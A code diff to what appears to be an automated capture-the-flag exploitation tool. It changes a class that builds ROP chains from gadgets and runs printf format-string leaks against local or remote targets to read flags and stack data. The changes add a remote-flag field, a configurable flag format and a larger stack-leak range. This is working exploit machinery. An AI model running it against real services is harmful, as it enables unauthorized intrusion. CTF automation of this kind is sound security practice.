@@ -40,7 +40,7 @@ class Against:
         syscall
     )
     """
-    def __init__(self, binary_path, libc, machine: Machine, ip, port):
+    def __init__(self, binary_path, libc, machine: Machine, ip, port, flag_format):
         """Create the against class."""
 
         context.update(
@@ -61,7 +61,8 @@ class Against:
         self.debug = False
 
         self.flag = None
-        self.flag_format = "flag"
+        self.remote_flag = None
+        self.flag_format = flag_format
 
         self.libc_offset_string = b""
         self.canary_offset_string = b""
@@ -190,6 +191,8 @@ class Against:
 
         reg_params = self.machine.reg_args
 
+        chars = [b'A', b'B', b'C', b'D', b'E']
+
         if len(parameters) > 0:
             for i in range(len(parameters)):
                 reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
@@ -205,7 +208,7 @@ class Against:
                                     index = reg_params.index(reg.decode("utf-8"))
                                     chain += p64(parameters[i])
                                 else:
-                                    chain += p64(0)
+                                    chain += chars[i] * 8
 
                             elif b"add rsp" in inst:
                                 value = int(inst.split(b",")[1].strip(), 16)
@@ -320,19 +323,19 @@ class Against:
         chain = b""
         return chain
 
-    def format_leak(self):
+    def format_leak(self,option):
         """Return the offset string for the format leak."""
         start_end = [0,0]
-        stack_len = 100
+        stack_len = 200
         string = ""
 
-        aegis_log.debug(f"Performing a printf format leak")
+        aegis_log.debug(f"Performing a printf format leak: {option}")
         # Run the process for stack len amount of times
         # leak the entire stack.
         for i in range(1, stack_len):
 
             
-            p = process(self.binary)
+            p = self.start(option)
             offset_str = "%" + str(i) + "$p."
             p.sendline(bytes(offset_str, "utf-8"))
 
@@ -363,13 +366,19 @@ class Against:
                             start_end[0] = 1
                         elif start_end[0] == 1 and "}" in flag.decode():
                             string += flag.decode()
-                            self.flag = string
+                            if option == "REMOTE":
+                                self.remote_flag = string 
+                            else:
+                                self.flag = string
                             break
                         elif start_end[0] == 1 and "}" not in flag.decode():
                             string += flag.decode()
                         elif "}" in flag.decode() and start_end[1] == 0:
                             string += flag.decode()
-                            self.flag = string
+                            if option == "REMOTE":
+                                self.remote_flag = string 
+                            else:
+                                self.flag = string
                             break
                     except Exception as e:
                         p.close()
